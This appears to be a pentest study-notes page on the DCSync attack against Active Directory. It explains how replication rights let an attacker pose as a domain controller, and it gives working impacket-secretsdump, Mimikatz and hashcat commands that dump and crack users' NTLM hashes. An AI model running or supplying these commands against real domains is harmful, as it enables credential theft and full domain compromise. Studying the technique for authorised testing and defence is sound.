# Domain Controller Synchronization

{% hint style="danger" %}
need access to a user that is a member of _Domain Admins_, _Enterprise Admins_, or _Administrators_

* _Replicating Directory Changes_, _Replicating Directory Changes All_, and _Replicating Directory Changes in Filtered Set_ rights
{% endhint %}

The [_Directory Replication Service_](https://msdn.microsoft.com/en-us/library/cc228086.aspx) (DRS) Remote Protocol uses [_replication_](https://technet.microsoft.com/en-us/library/cc772726\(v=ws.10\).aspx) to synchronize these redundant domain controllers. A domain controller may request an update for a specific object, like an account, using the [_IDL\_DRSGetNCChanges_](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/b63730ac-614c-431c-9501-28d6aca91894) API. The domain controller receiving a request for an update does not check whether the request came from a known domain controller. Instead, it only verifies that the associated SID has appropriate privileges. If we attempt to issue a rogue update request to a domain controller from a user with certain rights it will succeed.

By impersonating a domain controller, we can use replication to obtain any domain user credentials from a domain controller.&#x20;

### Linux

&#x20;Perform a dcsync attack to obtain the NTLM hash of _dave:_

{% code overflow="wrap" %}
```sh
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
```
{% endcode %}

* **-just-dc-user**: target user
* **domain/user:password@ip**

### Windows

Perform a dcsync attack to obtain the credentials of _dave:_

{% code title="Mimikatz" %}
```powershell
lsadump::dcsync /user:corp\dave
```
{% endcode %}

* can perform the dcsync attack to obtain any user password hash in the domain, even the domain administrator _Administrator_

### Hash Cracking

{% code overflow="wrap" %}
```shell
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
{% endcode %}
